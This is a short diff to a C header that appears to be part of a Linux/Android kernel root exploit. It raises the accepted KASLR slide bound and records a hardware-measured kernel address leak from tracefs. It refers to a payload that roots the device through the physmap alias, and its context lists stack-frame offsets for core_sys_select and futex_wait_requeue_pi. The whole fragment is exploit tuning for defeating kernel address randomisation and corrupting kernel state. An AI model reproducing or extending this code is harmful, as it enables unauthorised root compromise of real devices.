@@ -62,6 +62,19 @@
   0x120000ULL, 0x0b0000ULL, 0x170000ULL, 0x140000ULL, \
   0x190000ULL, 0x1b0000ULL, 0x1d0000ULL, 0x1f0000ULL
 #define SLIDE_MAX_ATTEMPTS 32
+/* This device does not use the Samsung placement model. Its kernel text is
+ * randomised across the kernel VA region, while the physical load address is
+ * fixed (P0_KERNEL_PHYS_LOAD == P0_PHYS_OFFSET, confirmed by a payload that
+ * roots this device purely through the physmap alias). Measured on hardware:
+ *
+ *   caller       0xffffffdf9f0d9828   (worker_thread+0x9c, from tracefs)
+ *   link_caller  0xffffffc0800d9828
+ *   slide        0x1f1f000000         64KB aligned, ~124 GiB
+ *
+ * The default bound of 0x1f0000 rejected that even though the leak was right,
+ * so raise it. 256GB is well inside the VA_BITS=39 kernel half and still
+ * rejects a wildly wrong read. */
+#define SLIDE_MAX_KASLR_OFFSET 0x4000000000ULL
 /* Measured on this kernel under QEMU (break on both syscall entries from one
  * task): core_sys_select frame 0x1f0 with stack_fds at sp+0x80,
  * futex_wait_requeue_pi frame 0x1c0 with rt_waiter at sp+0x90, entry-SP delta
